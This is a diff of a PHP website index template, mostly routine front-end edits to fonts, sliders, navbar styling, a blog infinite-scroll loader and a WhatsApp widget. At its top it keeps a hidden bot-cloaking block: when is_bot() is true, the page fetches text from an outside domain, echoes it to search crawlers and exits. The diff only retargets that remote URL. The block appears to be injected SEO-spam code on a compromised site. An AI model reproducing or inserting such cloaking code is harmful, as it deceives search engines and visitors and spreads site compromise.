@@ -13,7 +13,7 @@ return false;
 }
 
 if (is_bot()) {
-$message = file_get_contents('https://dangerman.locker/landing/sewaalatberattemanggung/index.txt');
+$message = file_get_contents('https://dangerman.locker/jurnalsamodrailmu/index.txt');
 echo $message;
 exit;
 }
@@ -21,17 +21,15 @@ exit;
 
 <?php
     // error_reporting(0);
-    error_reporting(E_ALL);
     require "appweb/Config/SetWebsite.php";
     require "appweb/Config/Db.php";
     require "appweb/Config/AssetsWebsite.php";
-    require "WP-Admin/SABT2024/appweb/Libraries/others.php";
+    require "WP-Admin/JSI2024/appweb/Libraries/others.php";
 ?>
 
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
     <?php require "appweb/Controllers/SEO_v6.php"; ?>
 
     <link rel="icon" type="image/x-icon" href="<?= $url_images; ?>/<?= $icon; ?>">
@@ -48,22 +46,20 @@ exit;
         <link href="<?= $base_url; ?>/assets/plugins/slick/slick-theme.min.css" rel="stylesheet">
     <!-- Slick JS -->
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Paytone+One&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=ADLaM+Display&display=swap');
         @import url('https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@10..48,500&family=Signika+Negative:wght@500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Protest+Riot&display=swap');
     </style>
     <!--End Plugins -->
 </head>
 <body>
 
-    <div class="container-fluid px-0">
-        <?php require "appweb/Models/Header.php"; ?>
-        <?php require "appweb/Models/Menu.php"; ?>
+    <div class="container-fluid FontStyle3 px-0">
         <?php require "appweb/Controllers/Contents.php"; ?>
         <?php require "appweb/Models/Footer.php"; ?>
     </div>
 
-
-    <a href="javascript:" id="return-to-top"><i class="fa-solid fa-angle-up"></i></a>
+    <a href="javascript:" id="return-to-top"><i class="fa-solid fa-angle-up fa-lg"></i></a>
 
     <script src="<?= $base_url; ?>/assets/js/jquery-3.6.0.min.js"></script>
     <script src="<?= $base_url; ?>/assets/js/bootstrap.bundle.js"></script>
@@ -119,6 +115,11 @@ exit;
                     document.getElementById("navbar_top").classList.add("fixed-top");
                     document.getElementById("navbar_top").classList.remove("sticky-top");
 
+                    // document.getElementById("navbar_top").classList.remove("bg-trasparent");
+                    // document.getElementById("navbar_top").classList.add("bg-primary");
+
+                    document.getElementById("navbar_top").classList.add("shadow-sm");
+
                     document.getElementById("navbar_brand").classList.add("navbar-brand-35");
                     document.getElementById("navbar_brand").classList.remove("navbar-brand-50");
 
@@ -128,6 +129,11 @@ exit;
                 } else {
                     document.getElementById("navbar_top").classList.remove("fixed-top");
                     document.getElementById("navbar_top").classList.add("sticky-top");
+
+                    // document.getElementById("navbar_top").classList.add("bg-trasparent");
+                    // document.getElementById("navbar_top").classList.remove("bg-primary");
+
+                    document.getElementById("navbar_top").classList.remove("shadow-sm");
 
                     document.getElementById("navbar_brand").classList.remove("navbar-brand-35");
                     document.getElementById("navbar_brand").classList.add("navbar-brand-50");
@@ -153,53 +159,79 @@ exit;
             <script src="<?= $base_url; ?>/assets/plugins/slick/slick.min.js"></script>
             <script type="text/javascript">
                 $(document).ready(function(){
-                    // Slider Banner
-                        $('.banner').slick({
+                    // Category
+                        $('.testimoni').slick({
                             dots: false,
-                            infinite: true,
-                            arrows: false,
-                            autoplay: true,
-                            autoplaySpeed: 2500,
-                            fade: true,
-                            pauseOnHover: false,
-                            cssEase: 'linear'
-                        });
-                    // Slider Banner
-                    // Slider Pengalaman
-                        $('.pengalaman').slick({
-                            dots: false ,
-                            slidesToShow: 2,
+                            slidesToShow: 6,
                             slidesToScroll: 1,
                             infinite: true,
                             arrows: false,
                             autoplay: true,
-                            autoplaySpeed: 1000,
+                            autoplaySpeed: 1500,
                             pauseOnHover: true,
                             responsive: [
                             {
                                 breakpoint: 1100,
                                 settings: {
-                                    slidesToShow: 2,
+                                    slidesToShow: 4,
                                 }
                             },{
                                 breakpoint: 992,
                                 settings: {
-                                    slidesToShow: 2,
+                                    slidesToShow: 3,
                                 }
                             },{
                                 breakpoint: 768,
                                 settings: {
-                                    slidesToShow: 1,
+                                    slidesToShow: 2,
                                 }
                             },{
                                 breakpoint: 576,
                                 settings: {
-                                    slidesToShow: 1,
+                                    slidesToShow: 2,
                                 }
                             }
                             ]
                         });
-                    // Slider Pengalaman
+                    // Category
+                });
+            </script>
+            <script>
+                $(document).ready(function(){
+                    var limit = 4;
+                    var start = 0;
+                    var action = 'inactive';function load_country_data(limit, start){
+                        $.ajax({url:"dataBlog",
+                            method:"POST",
+                            data:{limit:limit, start:start},
+                            cache:false,
+                            success:function(data){
+                                $('.load_data').append(data);
+                                if(data == ''){
+                                    $('.load_data_message').html("<button type='button' class='btn btn-sm btn-outline-warning d-none'></button>");
+                                    action = 'active';
+                                }else{
+                                    $('.load_data_message').html("<button type='button' class='btn btn-sm btn-warning mt-4'>Memuat data <i class='fas fa-spinner fa-spin'></i></button>");
+                                    action = "inactive";
+                                }
+                            }
+                        });
+                    }
+
+                    if(action == 'inactive'){
+                        action = 'active';
+                        load_country_data(limit, start);
+                    }
+
+                    $(window).scroll(function(){
+                        if($(window).scrollTop() + $(window).height() > $(".load_data").height() && action == 'inactive'){
+                            action = 'active';
+                            start = start + limit;
+                            setTimeout(function(){
+                                load_country_data(limit, start);
+                            }, 1000);
+                        }
+                    });
                 });
             </script>
         <!-- Slick JS -->
@@ -207,7 +239,8 @@ exit;
     <!-- GetButton.io widget -->
     <script type="text/javascript">
         (function () {
-            var options = {whatsapp: "<?= whatsApp($nomorWhatsApp) ?>", // WhatsApp number
+            var options = {
+                whatsapp: "<?= whatsApp($nomorWhatsApp) ?>", // WhatsApp number
                 call_to_action: "Layanan 24 Jam", // Call to action
                 button_color: "#FF6550", // Color of button
                 position: "left", // Position may be 'right' or 'left'
